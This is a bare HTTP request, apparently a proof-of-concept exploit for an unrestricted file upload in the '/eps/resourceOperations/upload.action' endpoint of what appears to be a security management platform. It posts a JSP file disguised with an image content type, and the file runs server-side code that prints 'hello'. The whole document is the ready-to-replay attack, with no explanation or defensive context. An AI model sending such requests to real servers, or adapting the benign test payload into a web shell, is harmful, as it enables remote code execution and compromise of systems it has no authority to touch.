POST /eps/resourceOperations/upload.action HTTP/1.1
Host: 1.1.1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cookie: ISMS_8700_Sessionname=5bGx5rW35LmL5YWz
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Length: 212
------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg
<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--